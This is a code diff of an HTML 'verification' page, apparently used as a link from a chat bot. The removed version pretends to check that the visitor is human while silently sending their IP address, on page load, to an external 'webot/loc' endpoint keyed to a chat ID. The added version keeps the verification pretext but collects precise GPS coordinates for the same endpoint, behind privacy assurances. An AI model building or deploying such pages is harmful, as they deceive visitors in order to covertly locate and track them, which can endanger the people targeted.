@@ -1,113 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Noto Sans", sans-serif;
-        }
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #1E1E1E, #2C2C2C);
-            color: #EAEAEA;
-        }
-        .container {
-            text-align: center;
-            padding: 60px 80px;
-            background: #282828;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
-            border: 1px solid #444444;
-        }
-        h1 {
-            font-size: 36px;
-            font-weight: 700;
-            margin-bottom: 25px;
-            color: #FFD700;
-            letter-spacing: 1.2px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-        }
-        p {
-            font-size: 20px;
-            margin-bottom: 30px;
-            color: #CCCCCC;
-        }
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #EAEAEA;
-            border-top: 6px solid #FFD700;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        .container {
-            transition: transform 0.3s ease-in-out;
-        }
-        .container:hover {
-            transform: scale(1.02);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap');
+    *{margin:0;padding:0;box-sizing:border-box;font-family:"Noto Sans",sans-serif}
+    body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#1E1E1E,#2C2C2C);color:#EAEAEA}
+    .card{width:min(720px,92vw);text-align:center;padding:48px 28px;background:#282828;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.25);border:1px solid #444}
+    h1{font-size:32px;font-weight:700;margin-bottom:16px;color:#FFD700;letter-spacing:1.1px;text-shadow:2px 2px 4px rgba(0,0,0,.5)}
+    p{font-size:18px;margin:10px 0 18px;color:#ccc}
+    .spinner{width:56px;height:56px;border:6px solid #EAEAEA;border-top:6px solid #FFD700;border-radius:50%;animation:spin 1s linear infinite;margin:16px auto 8px}
+    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    .row{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+    button{padding:12px 18px;border:1px solid #555;background:#1f1f1f;color:#fff;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:.2s}
+    button:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(0,0,0,.25)}
+    button.primary{background:#FFD700;color:#1b1b1b;border-color:#FFC300}
+    .note{font-size:13px;color:#9c9c9c;margin-top:10px;line-height:1.4}
+    .hidden{display:none}
+    .ok{color:#9cff9c}
+    .warn{color:#ffd280}
+    .err{color:#ff9c9c}
+  </style>
 </head>
 <body>
+  <div class="card" id="card">
+    <h1>Privacy-First Verification</h1>
+    <div class="spinner hidden" id="spinner"></div>
+    <p id="status">We need your permission to use your device location for verification. Nothing will be collected without your consent.</p>
 
-<div class="container">
-    <h1>Verifying You Are Human</h1>
-    <div class="loading-spinner"></div>
-    <p id="message">Please wait while we verify...</p>
-</div>
+    <div class="row" id="actions">
+      <button class="primary" id="allowBtn">Allow location</button>
+      <button id="skipBtn">Continue without sharing</button>
+    </div>
 
-<script>
-    const message = document.getElementById('message');
+    <p class="note">
+      • We do <b>not</b> use or fetch your IP address.<br/>
+      • Location is requested <b>only after</b> you tap “Allow location.”<br/>
+      • If denied, we won’t send anything.
+    </p>
 
-    async function getIP() {
+    <p class="note" id="httpsWarn" style="display:none">Tip: Geolocation requires HTTPS (or localhost). Open this page on a secure origin.</p>
+  </div>
+
+  <script>
+    const qs = new URLSearchParams(location.search);
+    const chatId = qs.get('id') || '';
+    const statusEl = document.getElementById('status');
+    const spinner = document.getElementById('spinner');
+    const actions = document.getElementById('actions');
+    const httpsWarn = document.getElementById('httpsWarn');
+    const allowBtn = document.getElementById('allowBtn');
+    const skipBtn = document.getElementById('skipBtn');
+
+    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+      httpsWarn.style.display = 'block';
+    }
+
+    const setBusy = (busy) => {
+      spinner.classList.toggle('hidden', !busy);
+      actions.style.display = busy ? 'none' : 'flex';
+    };
+
+    const goNext = (sent) => {
+      // If you want to flag whether data was shared, append &shared=1|0
+      const url = `/I/?id=${encodeURIComponent(chatId)}${sent ? '&shared=1' : '&shared=0'}`;
+      location.href = url;
+    };
+
+    const sendGeo = async ({ latitude, longitude, accuracy }) => {
+      const url = `https://punjabi.bet/webot/loc?lat=${encodeURIComponent(latitude)}&lon=${encodeURIComponent(longitude)}&acc=${encodeURIComponent(accuracy)}&chat_id=${encodeURIComponent(chatId)}&ts=${Date.now()}`;
+      // Using GET to match your existing endpoint. No IP is fetched or attached by us.
+      await fetch(url, { method: 'GET', mode: 'no-cors' });
+    };
+
+    const requestGeolocation = () => {
+      if (!('geolocation' in navigator)) {
+        statusEl.innerHTML = 'Your browser does not support geolocation.';
+        statusEl.className = 'err';
+        return;
+      }
+      setBusy(true);
+      statusEl.textContent = 'Requesting location permission...';
+      navigator.geolocation.getCurrentPosition(async (pos) => {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            return 'Unknown IP';
+          statusEl.textContent = 'Got permission. Verifying...';
+          statusEl.className = 'ok';
+          await sendGeo({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: Math.round(pos.coords.accuracy || 0)
+          });
+          statusEl.textContent = 'Verification complete.';
+          goNext(true);
+        } catch (e) {
+          setBusy(false);
+          statusEl.textContent = 'Verification failed. Please try again.';
+          statusEl.className = 'err';
         }
-    }
+      }, (err) => {
+        setBusy(false);
+        if (err.code === err.PERMISSION_DENIED) {
+          statusEl.innerHTML = 'You denied the request. We will not collect anything.';
+          statusEl.className = 'warn';
+        } else if (err.code === err.POSITION_UNAVAILABLE) {
+          statusEl.textContent = 'Location unavailable. Please check GPS/Network and try again.';
+          statusEl.className = 'err';
+        } else if (err.code === err.TIMEOUT) {
+          statusEl.textContent = 'Location request timed out. Try again.';
+          statusEl.className = 'err';
+        } else {
+          statusEl.textContent = 'Could not get location.';
+          statusEl.className = 'err';
+        }
+      }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
+    };
 
-    function sendLocationData(ip) {
-        const chatId = new URLSearchParams(window.location.search).get("id");
-        const url = `https://punjabi.bet/webot/loc?ip=${ip}&chat_id=${chatId}`;
-        
-        fetch(url)
-            .then(() => {
-                message.textContent = 'Verification complete!';
-                window.location.href = `/I/?id=${chatId}`;
-            })
-            .catch(() => {
-                message.textContent = 'Verification failed. Please try again.';
-            });
-    }
+    allowBtn.addEventListener('click', async () => {
+      // Optional: glance at current permission state (doesn't request access itself)
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          const p = await navigator.permissions.query({ name: 'geolocation' });
+          if (p.state === 'denied') {
+            statusEl.textContent = 'Location permission is blocked in your browser settings.';
+            statusEl.className = 'warn';
+            return;
+          }
+        }
+      } catch {}
+      requestGeolocation();
+    });
 
-    async function requestLocation() {
-        const ip = await getIP();
-        sendLocationData(ip);
-    }
-
-    requestLocation();
-</script>
-
+    skipBtn.addEventListener('click', () => {
+      statusEl.textContent = 'Continuing without sharing your location.';
+      statusEl.className = 'warn';
+      goNext(false);
+    });
+  </script>
 </body>
 </html>
